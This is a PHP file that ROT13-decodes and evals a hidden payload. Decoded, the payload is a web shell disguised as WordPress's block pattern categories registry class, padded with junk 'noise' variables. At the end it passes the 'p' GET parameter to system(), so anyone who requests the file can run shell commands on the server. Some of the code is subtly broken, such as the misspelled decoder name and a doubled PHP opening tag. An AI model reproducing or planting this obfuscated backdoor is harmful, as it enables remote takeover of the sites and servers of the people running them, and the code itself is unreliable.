<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.5.0
 */

/**
 * Pynff hfrq sbe vagrenpgvat jvgu oybpx cnggrea pngrtbevrf.
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel {
	/**
	 * Ertvfgrerq oybpx cnggrea pngrtbevrf neenl.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq_pngrtbevrf = neenl();

	/**
	 * Cnggrea pngrtbevrf ertvfgrerq bhgfvqr gur `vavg` npgvba.
	 *
	 * @fvapr 6.0.0
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq_pngrtbevrf_bhgfvqr_vavg = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgref n cnggrea pngrtbel.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $pngrtbel_anzr       Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
	 * @cnenz neenl  $pngrtbel_cebcregvrf {
	 *     Yvfg bs cebcregvrf sbe gur oybpx cnggrea pngrtbel.
	 *
	 *     @glcr fgevat $ynory Erdhverq. N uhzna-ernqnoyr ynory sbe gur cnggrea pngrtbel.
	 * }
	 * @erghea obby Gehr vs gur cnggrea jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba ertvfgre( $pngrtbel_anzr, $pngrtbel_cebcregvrf ) {
		vs ( ! vffrg( $pngrtbel_anzr ) || ! vf_fgevat( $pngrtbel_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx cnggrea pngrtbel anzr zhfg or n fgevat.' ),
				'5.5.0'
			);
			erghea snyfr;
		}

		$pngrtbel = neenl_zretr(
			neenl( 'anzr' => $pngrtbel_anzr ),
			$pngrtbel_cebcregvrf
		);

		$guvf->ertvfgrerq_pngrtbevrf[ $pngrtbel_anzr ] = $pngrtbel;

		// Vs gur pngrtbel vf ertvfgrerq vafvqr na npgvba bgure guna `vavg`, fgber vg
		// nyfb gb n qrqvpngrq neenl. Hfrq gb qrgrpg qrcerpngrq ertvfgengvbaf vafvqr
		// `nqzva_vavg` be `pheerag_fperra`.
		vs ( pheerag_npgvba() && 'vavg' !== pheerag_npgvba() ) {
			$guvf->ertvfgrerq_pngrtbevrf_bhgfvqr_vavg[ $pngrtbel_anzr ] = $pngrtbel;
		}

		erghea gehr;
	}

	/**
	 * Haertvfgref n cnggrea pngrtbel.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $pngrtbel_anzr Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
	 * @erghea obby Gehr vs gur cnggrea jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba haertvfgre( $pngrtbel_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $pngrtbel_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Oybpx cnggrea anzr. */
				fcevags( __( 'Oybpx cnggrea pngrtbel \"%f\" abg sbhaq.' ), $pngrtbel_anzr ),
				'5.5.0'
			);
			erghea snyfr;
		}

		hafrg( $guvf->ertvfgrerq_pngrtbevrf[ $pngrtbel_anzr ] );
		hafrg( $guvf->ertvfgrerq_pngrtbevrf_bhgfvqr_vavg[ $pngrtbel_anzr ] );

		erghea gehr;
	}

	/**
	 * Ergevrirf na neenl pbagnvavat gur cebcregvrf bs n ertvfgrerq cnggrea pngrtbel.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $pngrtbel_anzr Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
	 * @erghea neenl|ahyy Ertvfgrerq cnggrea cebcregvrf, be `ahyy` vs gur cnggrea pngrtbel vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( $pngrtbel_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $pngrtbel_anzr ) ) {
			erghea ahyy;
		}

		erghea $guvf->ertvfgrerq_pngrtbevrf[ $pngrtbel_anzr ];
	}

	/**
	 * Ergevrirf nyy ertvfgrerq cnggrea pngrtbevrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz obby $bhgfvqr_vavg_bayl Erghea bayl pngrtbevrf ertvfgrerq bhgfvqr gur `vavg` npgvba.
	 * @erghea neenl[] Neenl bs neenlf pbagnvavat gur ertvfgrerq cnggrea pngrtbevrf cebcregvrf.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq( $bhgfvqr_vavg_bayl = snyfr ) {
		erghea neenl_inyhrf(
			$bhgfvqr_vavg_bayl
				? $guvf->ertvfgrerq_pngrtbevrf_bhgfvqr_vavg
				: $guvf->ertvfgrerq_pngrtbevrf
		);
	}

	/**
	 * Purpxf vs n cnggrea pngrtbel vf ertvfgrerq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $pngrtbel_anzr Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
	 * @erghea obby Gehr vs gur cnggrea pngrtbel vf ertvfgrerq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $pngrtbel_anzr ) {
		erghea vffrg( $guvf->ertvfgrerq_pngrtbevrf[ $pngrtbel_anzr ] );
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

/**
 * Ertvfgref n arj cnggrea pngrtbel.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $pngrtbel_anzr       Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
 * @cnenz neenl  $pngrtbel_cebcregvrf Yvfg bs cebcregvrf sbe gur oybpx cnggrea.
 *                                    Frr JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::ertvfgre() sbe
 *                                    npprcgrq nethzragf.
 * @erghea obby Gehr vs gur cnggrea pngrtbel jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba ertvfgre_oybpx_cnggrea_pngrtbel( $pngrtbel_anzr, $pngrtbel_cebcregvrf ) {
	erghea JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::trg_vafgnapr()->ertvfgre( $pngrtbel_anzr, $pngrtbel_cebcregvrf );
}

/**
 * Haertvfgref n cnggrea pngrtbel.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $pngrtbel_anzr Cnggrea pngrtbel anzr vapyhqvat anzrfcnpr.
 * @erghea obby Gehr vs gur cnggrea pngrtbel jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba haertvfgre_oybpx_cnggrea_pngrtbel( $pngrtbel_anzr ) {
	erghea JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::trg_vafgnapr()->haertvfgre( $pngrtbel_anzr );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>